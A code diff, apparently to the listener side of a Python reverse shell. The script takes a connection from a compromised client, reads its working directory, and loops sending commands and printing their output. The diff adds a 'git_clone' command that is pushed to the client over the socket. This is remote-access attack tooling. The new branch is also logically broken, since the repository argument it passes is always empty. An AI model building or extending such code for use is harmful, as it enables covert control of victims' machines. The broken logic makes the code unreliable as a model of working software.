@@ -30,7 +30,17 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 cwd = client_socket.recv(BUFFER_SIZE).decode()
 print("[+] Current working directory:", cwd)
 
-
+def send_git_clone_command(s, repo):
+    # the git_clone command
+    command = f"git_clone {repo}"
+    try:
+        # send the git_clone command to the client
+        s.send(command.encode())
+        # receive the response from the client
+        response = s.recv(BUFFER_SIZE).decode()
+        print(f"Response: {response}")
+    except socket.error as e:
+        print(f"Socket error: {str(e)}")
 
 #INTERACTION WITH CLIENT
 while True:
@@ -44,6 +54,9 @@ while True:
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
+    if command.lower() == "git_clone":
+        # if git_clone command was issued, send the repo name
+        send_git_clone_command(client_socket, "\n".join(command.split()[1:]))
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
     # split command output and current directory
